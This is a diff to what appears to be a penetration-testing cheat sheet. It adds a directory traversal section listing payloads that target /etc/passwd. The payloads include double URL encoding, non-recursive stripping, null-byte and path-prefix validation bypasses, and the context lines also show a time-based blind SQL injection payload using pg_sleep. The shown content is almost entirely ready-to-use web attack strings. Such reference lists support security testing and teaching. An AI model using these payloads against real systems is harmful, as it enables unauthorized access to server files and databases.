@@ -119,7 +119,13 @@ select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end
 ### SQLite
 
 ## Directory Traversal Section
-
+```bash
+../../../etc/passwd # Simple case
+..%252f..%252f..%252fetc/passwd # Double URL Encoding
+....//....//....//etc/passwd # Stripped non-recursively
+../../../etc/passwd%00.png # Null byte bypass 
+images/../../../etc/passwd # Validation of start of path
+```
 
 
 ## Insecure Deserialization Section
